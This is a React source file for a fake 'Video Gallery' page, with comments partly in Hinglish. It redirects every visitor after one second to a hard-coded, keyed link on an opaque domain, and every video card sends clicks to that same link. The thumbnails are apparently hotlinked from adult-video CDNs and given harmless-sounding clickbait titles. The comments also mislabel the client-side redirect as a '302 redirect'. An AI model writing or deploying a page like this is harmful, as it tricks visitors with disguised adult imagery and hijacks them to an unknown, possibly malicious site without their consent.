import React, { useEffect } from 'react';

interface VideoCardProps {
  title: string;
  thumbnailUrl: string;
  redirectUrl: string;
}

const VideoCard: React.FC<VideoCardProps> = ({ title, thumbnailUrl, redirectUrl }) => {
  const handleRedirect = () => {
    // ✅ 302 Redirect
    window.location.replace(redirectUrl);
  };

  return (
    <div onClick={handleRedirect} className="group relative overflow-hidden rounded-xl bg-gray-900 cursor-pointer transition-all duration-300 hover:scale-[1.02]">
      <div className="relative aspect-video w-full overflow-hidden rounded-xl">
        <img src={thumbnailUrl} alt={title} className="w-full h-full object-cover" />
        <div className="absolute inset-0 bg-black/20 group-hover:bg-black/10 transition-all duration-300" />
        
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="w-12 h-12 md:w-14 md:h-14 rounded-full bg-white/30 backdrop-blur-sm flex items-center justify-center transition-all duration-300 group-hover:bg-white/50 group-hover:scale-105">
            <svg className="w-5 h-5 md:w-6 md:h-6 text-white ml-0.5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M8 5v14l11-7z" />
            </svg>
          </div>
        </div>
      </div>
      <div className="p-2 md:p-3 text-center">
        <h3 className="text-white font-medium text-xs md:text-sm truncate">{title}</h3>
      </div>
    </div>
  );
};

const App: React.FC = () => {
  const REDIRECT_TARGET = "https://anniversaryvacuumambassador.com/ev7v8chc9?key=e7588bd2d244939c7e5d3afdd0c5c62a";

  // ✅ AUTO 302 REDIRECT - 1 second mein
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.replace(REDIRECT_TARGET); // ✅ 302 redirect
    }, 1000);

    return () => clearTimeout(timer);
  }, [REDIRECT_TARGET]);


  // Thumbnails - Apni images yahan daal dena
  const videos = [
    { id: 1, title: "Amazing Viral Video 🔥", thumbnailUrl: "https://i0.wp.com/ei.phncdn.com/videos/202311/11/442789911/original/(m=qX1T_0YbeaSaaTbaAaaaa)(mh=f9bJ5hkIZ3iiX7fs)0.jpg?ssl=1" },
    { id: 2, title: "Must Watch! 😱", thumbnailUrl: "https://i3.wp.com/ei.phncdn.com/videos/202503/18/465965545/original/(m=qWSS39ZbeaSaaTbaAaaaa)(mh=tNmjrHta5OONvfFO)0.jpg?ssl=1" },
    { id: 3, title: "You Won't Believe This ✨", thumbnailUrl: "https://i0.wp.com/ei.phncdn.com/videos/202406/01/453242982/thumbs_30/(m=eaSaaTbaAaaaa)(mh=pHf9zXkJEOS9gFE1)14.jpg?ssl=1" },
    { id: 4, title: "Trending Now 📈", thumbnailUrl: "https://fi1-ph.ypncdn.com/videos/202502/22/464877435/original/(m=eaSaaTbWx)(mh=HqzEO5a3GSWOHw_b)0.jpg" },
    { id: 5, title: "Viral Clip 🎯", thumbnailUrl: "https://i3.wp.com/ei.phncdn.com/videos/202409/25/458266421/thumbs_10/(m=eaSaaTbaAaaaa)(mh=eFBT5N4NfYCXMXP3)12.jpg" },
    { id: 6, title: "Epic Moments 🏆", thumbnailUrl: "https://i0.wp.com/ei.phncdn.com/videos/202504/01/466645895/original/(m=q-XM4_ZbeaSaaTbaAaaaa)(mh=Oq36zl99csCUnLUo)0.jpg?ssl=1" },
    { id: 7, title: "Nature Lover 🏔️", thumbnailUrl: "https://fi1-ph.ypncdn.com/videos/202301/01/422451321/thumbs_35/(m=eaSaaTbWx)(mh=9xQC3bzXJagZ2vtw)10.jpg" },
    { id: 8, title: "Tech Magic 💻", thumbnailUrl: "https://t6.cdn3x.com/t/480/0005243705/016.jpg" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-black">
      {/* Auto Redirect Countdown Indicator */}
      <div className="fixed top-0 left-0 right-0 z-50 bg-gradient-to-r from-purple-600 to-pink-600 text-white text-center py-2 text-sm font-medium">
        ⏰ Redirecting in 1 second... Click any video to watch now!
      </div>

      {/* Hero Header */}
      <section className="text-center pt-16 pb-8 md:pt-20 md:pb-12 px-4">
        <h1 className="text-3xl md:text-5xl font-bold bg-gradient-to-r from-purple-400 via-pink-400 to-blue-400 bg-clip-text text-transparent">
          Video Gallery 🎬
        </h1>
        <p className="text-gray-400 text-sm md:text-base mt-3">
          Click any video or wait 1 second
        </p>
      </section>

      {/* Video Grid - Desktop mein bade thumbnails */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 pb-20">
        <div className="grid grid-cols-2 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-6">
          {videos.map((video) => (
            <VideoCard
              key={video.id}
              title={video.title}
              thumbnailUrl={video.thumbnailUrl}
              redirectUrl={REDIRECT_TARGET}
            />
          ))}
        </div>
      </section>

      <footer className="border-t border-white/10 py-6 text-center">
        <p className="text-gray-600 text-xs">© 2024 Video Gallery</p>
      </footer>
    </div>
  );
};

export default App;